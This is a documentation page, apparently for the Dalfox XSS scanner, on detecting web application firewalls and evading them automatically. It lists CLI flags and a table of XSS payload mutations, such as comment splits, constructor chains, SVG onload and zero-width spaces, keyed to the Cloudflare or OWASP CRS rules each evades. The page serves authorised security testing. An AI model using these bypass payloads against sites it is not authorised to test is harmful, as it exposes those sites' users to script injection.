+++
title = "WAF Bypass"
description = "Detect WAFs automatically and apply per-WAF evasion strategies."
weight = 4
+++

Most real targets sit behind a WAF. Dalfox fingerprints the WAF, then automatically chooses an evasion strategy — extra encoders and payload mutations tuned to that specific WAF's rules.

## How it works

1. Dalfox sends a small set of **fingerprint probes** to the target.
2. If a known WAF signature shows up (headers like `cf-ray`, body markers like "Attention required!", or a 429/403 shape), Dalfox notes the WAF and its confidence.
3. The scanner merges the WAF's **extra encoders** into your encoder list and adds the WAF's **mutation list** to the payload generator.
4. Payload mutations are capped (3 variants per base payload) so request volume stays sane.

This is all on by default. You only touch flags if you want to disable or steer it.

## Supported WAFs

- Cloudflare
- AWS WAF
- Akamai
- Imperva / Incapsula
- ModSecurity
- OWASP CRS
- Sucuri
- F5 BIG-IP
- Barracuda
- FortiWeb
- Azure WAF
- Google Cloud Armor
- Fastly
- Wordfence

Unrecognised WAFs trigger a generic fallback strategy.

## Tuning the behaviour

### Auto (default)

```bash
dalfox https://target.app
# equivalent to:
dalfox https://target.app --waf-bypass auto
```

### Force a specific WAF

Skip fingerprinting and apply a chosen WAF's strategy directly:

```bash
dalfox https://target.app \
  --waf-bypass force \
  --force-waf cloudflare
```

Handy when the WAF masks its headers or sits behind a CDN.

### Disable WAF logic

```bash
dalfox https://target.app --waf-bypass off
```

No extra encoders, no mutations — you get just your configured payloads.

### Skip the probe

```bash
dalfox https://target.app --skip-waf-probe
```

Still uses header-based passive detection, but no provocation requests. Use when the target is flaky and you don't want to burn rate limit on a probe.

### Evasion throttle

When a WAF is detected, `--waf-evasion` automatically slows Dalfox to `workers=1` and `delay=3000ms` so you don't trip rate limiters:

```bash
dalfox https://target.app --waf-evasion
```

## Mutation tactics (under the hood)

Different WAFs fall to different tricks. A small sample:

| Mutation | Example | Works against |
|----------|---------|---------------|
| **HTML comment split** | `<scr<!---->ipt>` | Signature regex |
| **JS comment split** | `al/**/ert(1)` | Keyword filters |
| **Backtick call** | `` alert`1` `` | `alert(` regex |
| **Constructor chain** | `[].constructor.constructor('alert(1)')()` | Heavy keyword blocks |
| **Unicode JS escape** | `alert(1)` | JS-token filters |
| **Slash separator** | `<svg/onload=alert(1)/class=x>` | CRS 941160 |
| **SVG animate** | `<svg><animate onbegin=alert(1) attributeName=x>` | CRS 941110 |
| **HTML entity parens** | `alert&#40;1&#41;` | CRS 941370 |
| **Exotic whitespace** | form-feed / vertical tab | CRS 941320 |
| **Case alternation** | `<ScRiPt>` | Case-sensitive rules |
| **zwsp insertion** | `al​ert(1)` | Lexer-based detection |

You don't configure these directly — they're selected automatically per WAF. If you want to inspect what's happening, run with `--debug`.

## Combining with encoders

Your `--encoders` list and the WAF's extra encoders are merged. So this:

```bash
dalfox https://target.app -e url,base64
# Cloudflare detected → extra encoders: unicode, zwsp
# Effective: url, base64, unicode, zwsp
```

De-duplicates automatically, preserves order.

## Rate limiting & backoff

Dalfox tracks consecutive WAF blocks and automatically backs off with exponential sleep to avoid permanent blocks. You can help it along with `--delay` (per-request ms) and smaller `--workers` for fragile targets.

```bash
dalfox https://target.app --delay 500 --workers 10
```

## Debugging

Turn on the debug stream to see fingerprint decisions and the active strategy:

```bash
dalfox --debug https://target.app 2>&1 | grep -i waf
```

## Next

- [Stored XSS](../stored-xss/) covers the inject-here-verify-there pattern, which often interacts with WAFs.
- [Output &amp; Reports](../output/) for integrating findings into your pipeline.
